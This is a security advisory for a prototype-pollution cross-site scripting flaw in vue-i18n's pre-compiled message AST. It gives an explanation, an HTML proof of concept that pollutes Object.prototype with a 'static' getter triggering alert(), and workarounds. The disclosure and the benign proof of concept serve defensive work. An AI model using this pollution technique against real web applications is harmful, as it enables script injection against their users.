summary: "vue-i18n has cross-site scripting vulnerability with prototype pollution\n### Vulnerability\
  \ type\nXSS\n\n### Description\nvue-i18n can be passed locale messages to `createI18n` or\
  \ `useI18n`.\nwe can then translate them using `t` and `$t`.\nvue-i18n has its own syntax\
  \ for local messages, and uses a message compiler to generate AST.\nIn order to maximize the\
  \ performance of the translation function, vue-i18n uses bundler plugins such as `@intlify/unplugin-vue-i18n`\
  \ and bulder to convert the AST in advance when building the application.\nBy using that AST\
  \ as the locale message, it is no longer necessary to compile, and it is possible to translate\
  \ using the AST.\n\nThe AST generated by the message compiler has special properties for each\
  \ node in the AST tree to maximize performance. In the PoC example below, it is a `static`\
  \ property, but that is just one of the optimizations.\nAbout details of special properties,\
  \ see https://github.com/intlify/vue-i18n/blob/master/packages/message-compiler/src/nodes.ts\n\
  \nIn general, the locale messages of vue-i18n are optimized during production builds using\
  \ `@intlify/unplugin-vue-i18n`,\nso there is always a property that is attached during optimization\
  \ like this time.\nBut if you are using a locale message AST in development mode or your own,\
  \ there is a possibility of XSS if a third party injects.\n\n### Reproduce (PoC)\n```html\n\
  <!doctype html>\n<html>\n  <head>\n    <meta charset=\"utf-8\" />\n    <title>vue-i18n XSS</title>\n\
  \    <script src=\"https://unpkg.com/vue@3\"></script>\n    <script src=\"https://unpkg.com/vue-i18n@10\"\
  ></script>\n    <!-- Scripts that perform prototype contamination, such as being distributed\
  \ from malicious hosting sites or injected through supply chain attacks, etc. -->\n    <script>\n\
  \      /**\n       * Prototype pollution vulnerability with `Object.prototype`.\n       *\
  \ The 'static' property is part of the optimized AST generated by the vue-i18n message compiler.\n\
  \       * About details of special properties, see https://github.com/intlify/vue-i18n/blob/master/packages/message-compiler/src/nodes.ts\n\
  \       *\n       * In general, the locale messages of vue-i18n are optimized during production\
  \ builds using `@intlify/unplugin-vue-i18n`,\n       * so there is always a property that\
  \ is attached during optimization like this time.\n       * But if you are using a locale\
  \ message AST in development or your own, there is a possibility of XSS if a third party injects\
  \ prototype pollution code.\n       */\n      Object.defineProperty(Object.prototype, 'static',\
  \ {\n        configurable: true,\n        get() {\n          alert('prototype polluted!')\n\
  \          return 'prototype pollution'\n        }\n      })\n    </script> \n </head>\n \
  \ <body>\n    <div id=\"app\">\n      <p>{{ t('hello') }}</p>\n    </div>\n    <script>\n\
  \      const { createApp } = Vue\n      const { createI18n, useI18n } = VueI18n\n\n      //\
  \ AST style locale message, which build by `@intlify/unplugin-vue-i18n`\n      const en =\
  \ {\n        hello: {\n          type: 0,\n          body: {\n            items: [\n     \
  \         {\n                type: 3,\n                value: 'hello world!'\n           \
  \   }\n            ]\n          }\n        }\n      }\n\n      const i18n = createI18n({\n\
  \        legacy: false,\n        locale: 'en',\n        messages: {\n          en\n      \
  \  }\n      })\n\n      const app = createApp({\n        setup() {\n          const { t }\
  \ = useI18n()\n          return { t }\n        }\n      })\n      app.use(i18n)\n      app.mount('#app')\n\
  \    </script>\n  </body>\n</html>\n```\n\n### Workarounds\nBefore v10.0.0, we can work around\
  \ this vulnerability by using the regular compilation (`jit: false` of `@intlify/unplugin-vue-i18n`\
  \ plugin configuration) way instead of jit compilation.\n- jit compilation: https://vue-i18n.intlify.dev/guide/advanced/optimization.html#jit-compilation\n\
  - bundler plugin option: https://github.com/intlify/bundle-tools/tree/main/packages/unplugin-vue-i18n#jitcompilation\n\
  \n### References\n- [Simillar case: Vue 2 XSS vulnerability with prototype pollution](https://www.herodevs.com/vulnerability-directory/cve-2024-6783)"
